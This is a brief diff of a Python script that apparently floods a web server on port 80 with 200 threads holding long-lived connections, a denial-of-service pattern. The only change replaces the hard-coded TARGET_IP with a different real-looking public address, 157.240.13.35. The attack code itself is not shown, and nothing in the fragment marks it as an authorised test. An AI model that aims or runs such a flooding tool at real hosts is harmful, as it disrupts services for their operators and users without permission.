@@ -6,7 +6,7 @@ import time
 import random
 import string
 
-TARGET_IP = "210.56.13.117"
+TARGET_IP = "157.240.13.35"
 PORT = 80
 NUM_THREADS = 200  # Fewer threads, long-lived connections
 stop_event = threading.Event()
